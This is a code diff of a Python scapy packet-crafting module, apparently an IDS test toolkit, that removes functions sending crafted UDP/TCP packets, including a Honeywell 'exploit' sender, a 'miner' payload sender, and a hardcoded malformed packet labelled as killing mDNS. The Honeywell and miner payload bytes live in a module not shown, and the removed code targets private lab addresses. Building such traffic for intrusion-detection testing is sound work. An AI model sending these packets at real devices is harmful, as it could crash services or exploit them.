@@ -20,9 +20,6 @@ from scapy.sendrecv import sendp
 from scapy.volatile import RandInt, RandMAC
 from scapy.compat import raw
 
-from ktt.libs.packet_crafter.payloads import get_payload_for_honeywell, get_payload_for_miner1
-
-
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 
 
@@ -315,65 +312,6 @@ def send_DHCP_request_by_self_by_scapy(iface="wlp2s0", dst_eth='ff:ff:ff:ff:ff:f
     dhcp = DHCP(options=[("message-type", "discover"), "end"])
     packet = ethernet / ip / udp / bootp / dhcp
     sendp(packet, iface=iface)
-
-
-def send_payload_UDP(iface="virbr0",
-                     payload=b"\x00\x01\x00\x08" + b"\x00" * 16 + b"\x00\x03\x00\x04\x00\x00\x00\x04",
-                     src_eth=get_random_mac(),
-                     dst_eth="00:00:00:00:00:00",
-                     src_ip='192.168.122.192',
-                     dst_ip='192.168.122.190',
-                     sport=688,
-                     dport=677
-                     ):
-    """
-    todo: documentation
-    """
-    logging.debug("send pkt by %s " % src_ip)
-    customUdp = Ether(src=src_eth, dst=dst_eth) / IP(src=src_ip, dst=dst_ip) / UDP(
-        dport=dport, sport=sport) / raw(payload)
-    sendp(customUdp, iface=iface)
-
-
-def send_payload_TCP(iface="virbr0", pkt=None):
-    """
-    todo: documentation
-    """
-    if not pkt:
-        pkt = (Ether(dst="52:54:00:12:34:56") / IP(dst="192.168.2.2") / TCP(dport=443, flags="S", seq=789799))
-    print(pkt[TCP])
-    sendp(pkt, iface=iface)
-    portAsByte = None
-    for targetPort in range(1, 10000):
-        portAsByte = targetPort.to_bytes(2, 'big')
-    print(portAsByte)
-    sendp((Ether(dst="52:54:00:12:34:56") / IP(dst="192.168.2.2", proto=6) / raw(
-        b"\xf9\xa8" + portAsByte + b"\x91\x16\x82\x0a\x00\x00\x00\x00\x60\x02\x04\x00")), iface=iface)
-
-
-def send_UDP_ids_honeywell_exploit(iface="virbr0", src_ip=get_random_ip_by_subnet192168()):
-    """
-    todo: documentation
-    """
-    logging.debug("send exploit by %s " % src_ip)
-    send_payload_UDP(iface=iface, payload=get_payload_for_honeywell(), dport=51967, src_ip=src_ip)
-
-
-def send_UDP_ids_miner(iface="virbr0", src_ip=get_random_ip_by_subnet192168()):
-    """
-    todo: documentation
-    """
-    logging.debug("send exploit by %s " % src_ip)
-    send_payload_UDP(iface=iface, payload=get_payload_for_miner1(), dport=53, src_ip=src_ip)
-
-
-def send_UDP_killing_mdns(iface="virbr0", src_ip=get_random_ip_by_subnet192168()):
-    """
-    todo: documentation
-    """
-    bad_payload = b'\x124\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\xc0\x00\x00\x0c\x00\x00\x00\x00\x00\x00\x01,\t123456789\t123456789\t123456789\t123456789\t123456789\t123456789\t123456789\t123456789\t123456789\t123456789\t123456789\t123456789\t123456789\t123456789\t123456789\t123456789\t123456789\t123456789\t123456789\t123456789\t123456789\t123456789\t123456789\t123456789\t123456789\t123456789\t123456789\t123456789\t123456789\t123456789'
-    logging.debug("send killing mdns by %s " % src_ip)
-    send_payload_UDP(iface=iface, payload=bad_payload, dport=5533, src_ip=src_ip)
 
 
 def syn_scan(target_dst_ip="192.168.2.202", iface='tap0'):
